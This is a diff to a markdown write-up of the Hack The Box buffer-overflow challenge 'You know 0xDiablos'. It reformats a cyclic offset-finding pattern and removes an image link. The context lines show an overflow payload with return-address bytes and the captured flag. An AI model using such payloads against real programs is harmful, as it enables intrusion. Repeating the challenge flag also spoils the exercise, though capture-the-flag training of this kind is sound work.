@@ -178,11 +178,8 @@ GCC: (Debian 8.3.0-19) 8.3.0
 	0xdiablos.gpr   0xdiablos.lock   0xdiablos.lock~   0xdiablos.rep   bof.txt   peda-session-vuln.txt   vuln  You know 0xDiablos.zip  You know 0xDiablos.zip:Zone.Identifier
   ```
   
-  ```shell
-  # display the content of the file
-	cat bof.txt
-	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
-	```
+  `bof.txt`'s contents:  
+  AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
 
 7. Run (`r`) the program with `bof.txt` as input:
 
@@ -375,8 +372,6 @@ GCC: (Debian 8.3.0-19) 8.3.0
 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xde\xc02\x9\x90\x90\x90\HTB{0ur_Buff3r_1s_not_healthy}[*] Got EOF while reading in interactive
   ```
-
-![[0xdiablos_pwed.png]]
 
 <figure>
     <img src="0xdiablos_pwned.png"
